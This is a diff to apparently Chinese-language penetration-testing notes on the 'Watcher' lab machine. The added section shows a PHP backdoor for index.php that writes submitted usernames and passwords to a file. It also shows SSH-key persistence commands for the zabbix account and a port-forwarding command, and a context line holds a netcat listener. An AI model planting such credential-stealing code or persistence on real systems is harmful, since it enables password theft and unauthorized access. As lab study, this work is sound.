@@ -35,4 +35,23 @@ nc -lvnp 9011
 [★]$ source .venv/bin/activate
 ```
 
-#### rsa_id form Watcher
+#### rsa_id; index.php后门 form Watcher
+```
+// Backdoor 手动插入后门好酷
+	  $file = fopen("creds.txt", "a+");
+ 	fputs($file, "Username: {$_POST['name']} | Password: {$_POST['password']}\n");
+ 	header("Location: http://127.0.0.1/index.php");
+ 	fclose($file);	  
+
+//关于私钥
+zabbix@watcher:/var/lib/zabbix$ mkdir -p /var/lib/zabbix/.ssh //-p:如果父目录不存在就一起创建
+zabbix@watcher:/var/lib/zabbix$ ssh-keygen -t rsa -b 2048 -f /var/lib/zabbix/.ssh/id_rsa -N "" //-N ""空密码
+zabbix@watcher:/var/lib/zabbix$ cd .ssh
+zabbix@watcher:/var/lib/zabbix/.ssh$ ls
+id_rsa	id_rsa.pub
+zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa.pub > authorized_keys //把 公钥写入授权列表
+zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa
+[★]$ vi id_rs
+[★]$ chmod 600 id_rsa //-rw-------
+[★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N //-N 不执行远程命令
+```
